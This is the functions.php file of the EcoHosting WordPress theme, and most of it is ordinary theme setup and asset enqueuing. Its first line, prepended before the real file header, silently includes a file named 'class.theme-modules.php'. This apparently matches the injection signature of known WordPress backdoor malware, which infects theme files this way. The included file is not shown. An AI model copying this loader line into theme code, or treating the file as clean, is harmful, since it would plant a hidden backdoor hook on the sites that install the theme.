<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php 
/**
 * @version    2
 * @package    EcoHosting
 * @author     Themelooks <support@themelooks.com>
 *
 * Websites: http://www.themelooks.com
 *
 */

// Define Template Path 
define('ECOHOST_DIRECTORYPATHTURI', get_template_directory_uri().'/' );
define('ECOHOST_PATHTEMEDEMOURI', ECOHOST_DIRECTORYPATHTURI .'inc/eco-framework/demo-data/' );
define('ECOHOST_DIRECTORYCSSPATHTURI', ECOHOST_DIRECTORYPATHTURI .'css/' );
define('ECOHOST_DIRECTORYJSPATHTURI', ECOHOST_DIRECTORYPATHTURI .'js/' );
define('ECOHOST_PATHTEMPDIR', get_parent_theme_file_path().'/' );
define('ECOHOST_PATHTEMPDIRINC', ECOHOST_PATHTEMPDIR.'inc/' );
define('ECOHOST_PATHECOFRAME', ECOHOST_PATHTEMPDIRINC . 'eco-framework/' );
define('ECOHOST_PATHTEMPDIRDEMO', ECOHOST_PATHECOFRAME.'demo-data/' );
 
 
if( ! function_exists( 'ecohost_setup_theme' ) ):
    add_action( 'after_setup_theme', 'ecohost_setup_theme' );
    
    function ecohost_setup_theme(){
        
        // content width
        $GLOBALS['content_width'] = apply_filters( 'ecohost_content_width', 840 );

        
        // text domain for translation.
        load_theme_textdomain( 'ecohosting', get_template_directory() . '/languages' );
        
        // support title tage
        add_theme_support( 'title-tag' );
        
        // support logo
        add_theme_support( 'custom-logo');
        
        //  support post format
        add_theme_support( 'post-formats', array( 'video', 'audio' ) );
        
        // support post-thumbnails
        add_theme_support('post-thumbnails');

        // support Customize Selective Refresh Widgets
		add_theme_support( 'customize-selective-refresh-widgets' );

        // support custom background 
        add_theme_support( 'custom-background' );
        
        // support custom header
        add_theme_support( 'custom-header' );
        
        // support automatic feed links
        add_theme_support( 'automatic-feed-links' );
        
        // support html5
        add_theme_support( 'html5' );
		
        // Woocommerce Support
        add_theme_support( 'woocommerce' );
		
		// woo product gallery zoom, lightbox, slider support
		add_theme_support( 'wc-product-gallery-zoom' );
		add_theme_support( 'wc-product-gallery-lightbox' );
		add_theme_support( 'wc-product-gallery-slider' );
        
        // editor style
        add_editor_style('css/editor-style.css');
        
        // register nav menu
        register_nav_menus( array(
            'primary-menu' => esc_html__( 'Primary Menu', 'ecohosting' ),
        ) );
        
    }

endif;

/**
 * Enqueues scripts and styles.
 */

add_action( 'wp_enqueue_scripts', 'ecohost_enqueue_scripts' );
function ecohost_enqueue_scripts() {

	// Add google fonts,.
	wp_enqueue_style( 'raleway-font', ecohost_google_fonts(), array(), '2.0' );
    
	// Add font awesome css.
	wp_enqueue_style( 'font-awesome', ECOHOST_DIRECTORYCSSPATHTURI . 'font-awesome.min.css', array(), '4.6.2' );
    
	// Add jquery ui custom css.
	wp_enqueue_style( 'jquery-ui-custom', ECOHOST_DIRECTORYCSSPATHTURI . 'jquery-ui-custom.min.css', array(), '1.11.4' );	
    
    if( !is_page_template('template-whmcs.php') ){
        // Add bootstrap min.
        wp_enqueue_style( 'bootstrap-min', ECOHOST_DIRECTORYCSSPATHTURI . 'bootstrap.min.css', array(), '3.3.7' );	
    }
    
	// Add animate-min css.
	wp_enqueue_style( 'animate-min', ECOHOST_DIRECTORYCSSPATHTURI . 'animate.min.css', array(), '3.5.1' );	
    
	// Add owl-carousel css.
	wp_enqueue_style( 'owl-carousel', ECOHOST_DIRECTORYCSSPATHTURI . 'owl.carousel.css', array(), '1.3.3' );
    
	// Add ecohost main css.
	wp_enqueue_style( 'ecohost', ECOHOST_DIRECTORYCSSPATHTURI . 'ecohost.css', array(), '1.0.0' );	
    
	// Add owl-carousel css.
	wp_enqueue_style( 'ecohost-responsive', ECOHOST_DIRECTORYCSSPATHTURI . 'ecohost-responsive.css', array(), '1.0.0' );	
	

	// Theme stylesheet.
	wp_enqueue_style( 'ecohost-style', get_stylesheet_uri() );


	/**
     * enqueue script
     */
     
    // Add Google MAPS API JavaScript .
    if( ecohost_opt('eco_map_apikey')  ){
        
        wp_enqueue_script( 'maps-googleapis', '//maps.googleapis.com/maps/api/js?key='.ecohost_opt('eco_map_apikey') );
        
    }
	
	// Add jquery-ui-custom js .
	wp_enqueue_script( 'jquery-ui-custom', ECOHOST_DIRECTORYJSPATHTURI . 'jquery-ui-custom.min.js', array('jquery'), '1.11.4', true );	
	
    if( !is_page_template('template-whmcs.php') ){
	// Add bootstrap min js .
	wp_enqueue_script( 'bootstrap-min', ECOHOST_DIRECTORYJSPATHTURI . 'bootstrap.min.js', array('jquery'), '3.3.7', true );
    }
	// Add owl carousel min js .
	wp_enqueue_script( 'owl-carousel', ECOHOST_DIRECTORYJSPATHTURI . 'owl.carousel.min.js', array('jquery'), '1.0.0', true );
    
	// Add jquery waypoints js .
	wp_enqueue_script( 'jquery-waypoints', ECOHOST_DIRECTORYJSPATHTURI . 'jquery.waypoints.min.js', array('jquery'), '4.0.0', true );	
    
	// Add jquery waypoints js .
	wp_enqueue_script( 'jquery.tubular', ECOHOST_DIRECTORYJSPATHTURI . 'jquery.tubular.1.0.js', array('jquery'), '1.0', true );	
    
	// Add jquery counterup js .
	wp_enqueue_script( 'jquery-counterup', ECOHOST_DIRECTORYJSPATHTURI . 'jquery.counterup.min.js', array('jquery'), '1.0', true );	
    
	// Add jquery ui touch-punch js .
	wp_enqueue_script( 'jquery-ui-touch-punch', ECOHOST_DIRECTORYJSPATHTURI . 'jquery.ui.touch-punch.min.js', array('jquery'), '0.2.3', true );	
        
	// Add ecohosting main js .
	wp_enqueue_script( 'ecohost-main', ECOHOST_DIRECTORYJSPATHTURI . 'main.js', array('jquery'), '0.2.3', true );	
	
	

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

}

 
/**
 * google fonts 
 */

function ecohost_google_fonts() {
	
	$font_url = '';
	
	if( 'off' !== _x('on', 'Google font: on or off', 'ecohosting' ) ){
		$font_url = add_query_arg( 'family', urlencode('Raleway:700,300,500,800'), '//fonts.googleapis.com/css' );
	}
	
	return $font_url;
}
 
 
/**
 * include file
 */
require_once( ECOHOST_PATHTEMPDIRINC.'ecohost-functions.php' );
require_once( ECOHOST_PATHTEMPDIRINC.'ecohost-wp_bootstrap_pagination.php' );
require_once( ECOHOST_PATHTEMPDIRINC.'ecohost-theme-support.php' );
require_once( ECOHOST_PATHTEMPDIRINC.'ecohost-widgets-reg.php' );
require_once( ECOHOST_PATHTEMPDIRINC.'ecohost-breadcrumbs.php' );
require_once( ECOHOST_PATHTEMPDIRINC.'wp_bootstrap_navwalker.php' );
require_once( ECOHOST_PATHTEMPDIRINC.'ecohost-option-slide-add-filed.php' );
require_once( ECOHOST_PATHTEMPDIRINC.'ecohost-theme-css.php' );

require_once( ECOHOST_PATHECOFRAME.'eco-option/ecohost-option.php' );
require_once( ECOHOST_PATHECOFRAME.'eco-custom-meta/ecohost-config.php' );     
require_once( ECOHOST_PATHECOFRAME.'plugins-activation/ecohost-active-plugins.php' );
require_once( ECOHOST_PATHECOFRAME.'demo-data/demo-import.php' );
